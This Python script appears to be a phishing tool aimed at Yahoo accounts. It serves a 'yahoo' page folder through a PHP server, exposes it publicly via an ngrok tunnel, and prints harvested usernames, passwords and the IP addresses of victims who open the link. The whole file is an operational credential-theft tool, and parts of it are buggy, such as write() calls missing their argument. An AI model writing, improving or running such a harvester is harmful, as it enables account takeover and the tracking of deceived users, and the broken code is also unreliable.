from colorama import Fore 
from subprocess import Popen
import os
from pyngrok import ngrok 
import json
import time
import sys

stat_file = 0


def server():
    a=open("yahoo/usernames.json","w")
    b=a.write("")
    a.close()
    def phpserver():
        with open("Server","w") as phplog:
            Popen(("php","-S","localhost:7070","-t","yahoo"),stderr=phplog,stdout=phplog)
            
    phpserver()
    u=ngrok.connect(7070,"http").replace("http","https")
    print(u)



    def user():
        global stat_file
        if not str(os.stat("yahoo/usernames.json").st_size)==stat_file:
            stat_file=str(os.stat("yahoo/usernames.json").st_size)
            fileip=open("yahoo/usernames.json","r")
            b=fileip.read()
            try:
                infor=json.loads(b)
                for value in infor['dev']:
                    print(Fore.GREEN+"[+] "+Fore.WHITE+"Username :"+Fore.YELLOW+value['username'])
                    print(Fore.GREEN+"[+] "+Fore.WHITE+"Password :"+Fore.YELLOW+value['password'])
                    a=open("yahoo/usernames.json","w")
                    b=a.write()
                    a.close()
                    uss=open("yahoo/user.json","w")
                    b=uss.write()
                    uss.close()
            except:
                print("")
            
    def userip():
        global stat_file
        if not str(os.stat('yahoo/ip.txt').st_size)==stat_file:
            stat_file=str(os.stat('yahoo/ip.txt').st_size)
            fileip=open('yahoo/ip.txt','r')
            i=fileip.readlines()
            try:
                i=i[-1]
                print(Fore.GREEN+"\n [!]"+Fore.LIGHTCYAN_EX+" IP: %s opened link : "%(i)+time.ctime())
                o=open('yahoo/ip.txt','w')
                o.write("")
                o.close()
            except:
                print(" ")
            
    try:        
        while True:
            userip()
            user()
    except: 
        os.system("killall -KILL php")
        print("\n God Lock ...:)  ")
        sys.exit()